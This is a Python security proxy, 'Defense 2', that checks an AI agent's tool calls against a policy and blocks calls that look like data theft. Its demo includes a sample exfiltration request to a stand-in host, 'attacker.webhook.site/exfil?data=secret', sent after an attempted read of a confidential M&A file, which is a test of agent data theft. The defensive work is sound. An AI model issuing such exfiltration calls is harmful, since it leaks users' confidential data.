#!/usr/bin/env python3
"""
Defense 2: MCP-based Tool Inspector
This is a security proxy that sits between the agent and its tools,
enforcing policies defined in the MCP configuration.
"""

import yaml
import re
import json
from pathlib import Path
from typing import Dict, Any, Optional, Tuple
from datetime import datetime, timedelta
from urllib.parse import urlparse
from collections import defaultdict
import sys

# Load the MCP security policy
POLICY_PATH = Path(__file__).parent / "mcp_security_policy.yaml"


class MCPToolInspector:
    """
    MCP Tool Inspector - A security proxy for agent tools.
    Inspects and validates tool calls according to the MCP security policy.
    """

    def __init__(self, policy_path: Path = POLICY_PATH):
        """Initialize the inspector with a security policy."""
        with open(policy_path, 'r') as f:
            self.policy = yaml.safe_load(f)

        self.call_history = defaultdict(list)
        self.violation_log = []
        self.alerts = []

        print(f"[MCP] Tool Inspector initialized with policy: {self.policy['policy_name']}")

    def inspect_tool_call(self, tool_name: str, parameters: Dict[str, Any]) -> Tuple[bool, str]:
        """
        Inspect a tool call before execution.

        Args:
            tool_name: Name of the tool being called
            parameters: Parameters passed to the tool

        Returns:
            Tuple of (allowed: bool, reason: str)
        """
        print(f"\n[MCP] Inspecting call: {tool_name}({parameters})")

        # Check if tool is enabled
        tool_policy = self.policy.get('tools', {}).get(tool_name)
        if not tool_policy:
            return False, f"Tool '{tool_name}' not found in policy"

        if not tool_policy.get('enabled', False):
            return False, f"Tool '{tool_name}' is disabled by policy"

        # Check rate limits
        allowed, reason = self._check_rate_limit(tool_name, tool_policy)
        if not allowed:
            self._log_violation(tool_name, parameters, reason)
            return False, reason

        # Validate parameters
        allowed, reason = self._validate_parameters(tool_name, parameters, tool_policy)
        if not allowed:
            self._log_violation(tool_name, parameters, reason)
            return False, reason

        # Check security rules
        allowed, reason = self._check_security_rules(tool_name, parameters)
        if not allowed:
            self._log_violation(tool_name, parameters, reason)
            return False, reason

        # Record the call
        self._record_call(tool_name, parameters)

        print(f"[MCP] ✓ Call approved")
        return True, "Call approved by policy"

    def _check_rate_limit(self, tool_name: str, tool_policy: Dict) -> Tuple[bool, str]:
        """Check if the tool call is within rate limits."""
        rate_limit_config = tool_policy.get('rate_limit', {})
        max_calls = rate_limit_config.get('max_calls_per_minute')

        if max_calls is None:
            return True, "No rate limit"

        # Count calls in the last minute
        one_minute_ago = datetime.now() - timedelta(minutes=1)
        recent_calls = [
            call for call in self.call_history[tool_name]
            if call['timestamp'] > one_minute_ago
        ]

        if len(recent_calls) >= max_calls:
            return False, f"Rate limit exceeded: {len(recent_calls)}/{max_calls} calls in the last minute"

        return True, "Within rate limit"

    def _validate_parameters(self, tool_name: str, parameters: Dict, tool_policy: Dict) -> Tuple[bool, str]:
        """Validate tool call parameters against the policy."""
        param_validation = tool_policy.get('parameter_validation', {})

        for param_name, param_value in parameters.items():
            if param_name not in param_validation:
                continue

            param_rules = param_validation[param_name]

            # Check type
            expected_type = param_rules.get('type')
            if expected_type == 'string' and not isinstance(param_value, str):
                return False, f"Parameter '{param_name}' must be a string"

            # Check pattern
            pattern = param_rules.get('pattern')
            if pattern and not re.match(pattern, param_value):
                return False, f"Parameter '{param_name}' does not match required pattern"

            # Check forbidden patterns
            forbidden_patterns = param_rules.get('forbidden_patterns', [])
            for forbidden in forbidden_patterns:
                if re.search(forbidden, param_value):
                    return False, f"Parameter '{param_name}' contains forbidden pattern: {forbidden}"

            # Special handling for URLs
            if param_name == 'url':
                allowed, reason = self._validate_url(param_value, param_rules)
                if not allowed:
                    return False, reason

        return True, "Parameters validated"

    def _validate_url(self, url: str, rules: Dict) -> Tuple[bool, str]:
        """Validate a URL parameter against security rules."""
        try:
            parsed = urlparse(url)

            # Check protocol
            allowed_protocols = rules.get('allowed_protocols', [])
            if allowed_protocols and parsed.scheme not in allowed_protocols:
                return False, f"Protocol '{parsed.scheme}' not allowed. Allowed: {allowed_protocols}"

            # Check allowed domains
            allowed_domains = rules.get('allowed_domains', [])
            if allowed_domains:
                domain_allowed = False
                for allowed_domain in allowed_domains:
                    if allowed_domain.startswith('*'):
                        # Wildcard domain
                        base_domain = allowed_domain[2:]  # Remove *.
                        if parsed.netloc.endswith(base_domain):
                            domain_allowed = True
                            break
                    elif parsed.netloc == allowed_domain:
                        domain_allowed = True
                        break

                if not domain_allowed:
                    return False, f"Domain '{parsed.netloc}' not in allowlist: {allowed_domains}"

            # Check blocked domains
            blocked_domains = rules.get('blocked_domains', [])
            for blocked in blocked_domains:
                if blocked.startswith('*'):
                    base_domain = blocked[2:]
                    if parsed.netloc.endswith(base_domain):
                        return False, f"Domain '{parsed.netloc}' is explicitly blocked"
                elif parsed.netloc == blocked:
                    return False, f"Domain '{parsed.netloc}' is explicitly blocked"

            return True, "URL validated"

        except Exception as e:
            return False, f"Invalid URL: {str(e)}"

    def _check_security_rules(self, tool_name: str, parameters: Dict) -> Tuple[bool, str]:
        """Check cross-tool security rules."""
        security_rules = self.policy.get('security_rules', [])

        for rule in security_rules:
            if rule['name'] == 'exfiltration_detection':
                # Check if this is a fetch_web_data call after a recent read_document
                if tool_name == 'fetch_web_data':
                    trigger_config = rule['trigger'][0]
                    after_tool = trigger_config['after_tool']
                    within_seconds = trigger_config['within_seconds']

                    # Check recent call history
                    recent_cutoff = datetime.now() - timedelta(seconds=within_seconds)
                    recent_read_calls = [
                        call for call in self.call_history.get(after_tool, [])
                        if call['timestamp'] > recent_cutoff
                    ]

                    if recent_read_calls:
                        self._create_alert(rule['name'], f"{tool_name} called {within_seconds}s after {after_tool}")
                        return False, f"Security rule violated: {rule['log_message']}"

            elif rule['name'] == 'confused_deputy_protection':
                # Check for suspicious URL patterns
                if tool_name == 'fetch_web_data' and 'url' in parameters:
                    url = parameters['url']
                    trigger_config = rule['trigger'][0]

                    # Check URL length
                    if len(url) > trigger_config.get('url_length_exceeds', float('inf')):
                        return False, "URL suspiciously long - possible data exfiltration"

                    # Check URL contents
                    for pattern in trigger_config.get('url_contains', []):
                        if pattern in url:
                            return False, f"URL contains suspicious pattern: {pattern}"

        return True, "Security rules passed"

    def _record_call(self, tool_name: str, parameters: Dict):
        """Record a tool call in the history."""
        self.call_history[tool_name].append({
            'timestamp': datetime.now(),
            'parameters': parameters
        })

    def _log_violation(self, tool_name: str, parameters: Dict, reason: str):
        """Log a security violation."""
        violation = {
            'timestamp': datetime.now().isoformat(),
            'tool': tool_name,
            'parameters': parameters,
            'reason': reason
        }
        self.violation_log.append(violation)
        print(f"[MCP] ✗ VIOLATION: {reason}")

        # Write to log file if configured
        alerts_config = self.policy.get('alerts', {})
        if alerts_config.get('log_file', {}).get('enabled', False):
            log_path = Path(alerts_config['log_file']['path'])
            with open(log_path, 'a') as f:
                f.write(json.dumps(violation) + '\n')

    def _create_alert(self, rule_name: str, message: str):
        """Create a security alert."""
        alert = {
            'timestamp': datetime.now().isoformat(),
            'rule': rule_name,
            'message': message
        }
        self.alerts.append(alert)
        print(f"[MCP] 🚨 ALERT: {message}")

    def get_statistics(self) -> Dict[str, Any]:
        """Get inspector statistics."""
        return {
            'total_calls': sum(len(calls) for calls in self.call_history.values()),
            'calls_by_tool': {tool: len(calls) for tool, calls in self.call_history.items()},
            'violations': len(self.violation_log),
            'alerts': len(self.alerts)
        }


def demo_mcp_defense():
    """Demonstrate the MCP-based defense."""
    print("\n" + "="*60)
    print("DEFENSE 2: MCP TOOL INSPECTOR DEMONSTRATION")
    print("="*60 + "\n")

    inspector = MCPToolInspector()

    print("\nTest 1: Legitimate document read")
    print("-" * 60)
    allowed, reason = inspector.inspect_tool_call("read_document", {"filename": "market_summary.pdf"})
    print(f"Result: {'ALLOWED' if allowed else 'BLOCKED'} - {reason}\n")

    print("\nTest 2: Attempt to read confidential file")
    print("-" * 60)
    allowed, reason = inspector.inspect_tool_call("read_document", {"filename": "project_M&A_targets.pdf"})
    print(f"Result: {'ALLOWED' if allowed else 'BLOCKED'} - {reason}\n")

    print("\nTest 3: Attempt exfiltration (fetch_web_data after read_document)")
    print("-" * 60)
    malicious_url = "http://attacker.webhook.site/exfil?data=secret"
    allowed, reason = inspector.inspect_tool_call("fetch_web_data", {"url": malicious_url})
    print(f"Result: {'ALLOWED' if allowed else 'BLOCKED'} - {reason}\n")

    print("\nTest 4: Legitimate internal URL (after waiting)")
    print("-" * 60)
    import time
    time.sleep(6)  # Wait for exfiltration detection window to pass
    internal_url = "https://internal-wiki.company.com/search?q=market"
    allowed, reason = inspector.inspect_tool_call("fetch_web_data", {"url": internal_url})
    print(f"Result: {'ALLOWED' if allowed else 'BLOCKED'} - {reason}\n")

    print("\n" + "="*60)
    print("INSPECTOR STATISTICS")
    print("="*60)
    stats = inspector.get_statistics()
    print(json.dumps(stats, indent=2))


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "demo":
        demo_mcp_defense()
    else:
        print("MCP Tool Inspector")
        print("="*60)
        print("\nThis is a security proxy that inspects tool calls using MCP policies.")
        print("\nTo see the demonstration, run:")
        print("  python mcp_tool_inspector.py demo")
